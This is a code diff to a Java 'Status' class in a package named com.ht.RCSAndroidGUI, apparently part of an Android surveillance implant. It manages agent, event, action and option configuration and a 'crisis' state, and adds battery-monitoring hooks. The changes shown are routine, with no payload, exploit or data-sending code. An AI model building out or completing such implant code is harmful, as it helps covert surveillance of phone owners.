@@ -14,7 +14,6 @@ import android.content.Context;
 import android.util.Log;
 
 import com.ht.RCSAndroidGUI.action.Action;
-import com.ht.RCSAndroidGUI.agent.AgentBase;
 import com.ht.RCSAndroidGUI.agent.AgentConf;
 import com.ht.RCSAndroidGUI.agent.CrisisAgent;
 import com.ht.RCSAndroidGUI.conf.Option;
@@ -58,6 +57,8 @@ public class Status {
 	private boolean crisis = false;
 	private int crisisType;
 
+	private BatteryListener batteryListener;
+	
 	/**
 	 * Instantiates a new status.
 	 */
@@ -66,6 +67,8 @@ public class Status {
 		eventsMap = new HashMap<Integer, EventConf>();
 		actionsMap = new HashMap<Integer, Action>();
 		optionsMap = new HashMap<Integer, Option>();
+		
+		batteryListener = new BatteryListener();
 	}
 
 	/** The singleton. */
@@ -126,7 +129,7 @@ public class Status {
 	 * @param a
 	 *            the a
 	 * @throws RCSException
-	 *             the rCS exception
+	 *             the RCS exception
 	 */
 	public void addAgent(final AgentConf a) throws RCSException {
 		
@@ -145,7 +148,7 @@ public class Status {
 	 * @param e
 	 *            the e
 	 * @throws RCSException
-	 *             the rCS exception
+	 *             the RCS exception
 	 */
 	public void addEvent(final EventConf e) throws RCSException {
 		// Don't add the same event twice
@@ -164,7 +167,7 @@ public class Status {
 	 * @param a
 	 *            the a
 	 * @throws RCSException
-	 *             the rCS exception
+	 *             the RCS exception
 	 */
 	public void addAction(final Action a) throws RCSException {
 		// Don't add the same action twice
@@ -182,7 +185,7 @@ public class Status {
 	 * @param o
 	 *            the o
 	 * @throws RCSException
-	 *             the rCS exception
+	 *             the RCS exception
 	 */
 	public void addOption(final Option o) throws RCSException {
 		// Don't add the same option twice
@@ -263,7 +266,7 @@ public class Status {
 	 *            the index
 	 * @return the action
 	 * @throws RCSException
-	 *             the rCS exception
+	 *             the RCS exception
 	 */
 	public Action getAction(final int index) throws RCSException {
 		if (actionsMap.containsKey(index) == false) {
@@ -286,7 +289,7 @@ public class Status {
 	 *            the id
 	 * @return the agent
 	 * @throws RCSException
-	 *             the rCS exception
+	 *             the RCS exception
 	 */
 	public AgentConf getAgent(final int id) throws RCSException {
 		if (agentsMap.containsKey(id) == false) {
@@ -309,7 +312,7 @@ public class Status {
 	 *            the id
 	 * @return the event
 	 * @throws RCSException
-	 *             the rCS exception
+	 *             the RCS exception
 	 */
 	public EventConf getEvent(final int id) throws RCSException {
 		if (eventsMap.containsKey(id) == false) {
@@ -332,7 +335,7 @@ public class Status {
 	 *            the id
 	 * @return the option
 	 * @throws RCSException
-	 *             the rCS exception
+	 *             the RCS exception
 	 */
 	public Option getOption(final int id) throws RCSException {
 		if (optionsMap.containsKey(id) == false) {
@@ -381,9 +384,11 @@ public class Status {
 		synchronized (triggeredActions) {
 			final int size = triggeredActions.size();
 			final int[] triggered = new int[size];
+			
 			for (int i = 0; i < size; i++) {
 				triggered[i] = triggeredActions.get(i);
 			}
+			
 			return triggered;
 		}
 	}
@@ -413,7 +418,6 @@ public class Status {
 	}
 
 	public synchronized void setCrisis(int type) {
-
 		synchronized (lockCrisis) {
 			crisisType = type;
 		}
@@ -490,6 +494,17 @@ public class Status {
 
 	public void setRestarting(boolean b) {
 		// TODO Auto-generated method stub
-		
+	}
+	
+	public void batteryMonitor(Battery b) {
+		batteryListener.run(b);
+	}
+	
+	public void attachToBattery(Object o) {
+		batteryListener.attach(o);
+	}
+	
+	public void detachFromBattery(Object o) {
+		batteryListener.detach(o);
 	}
 }
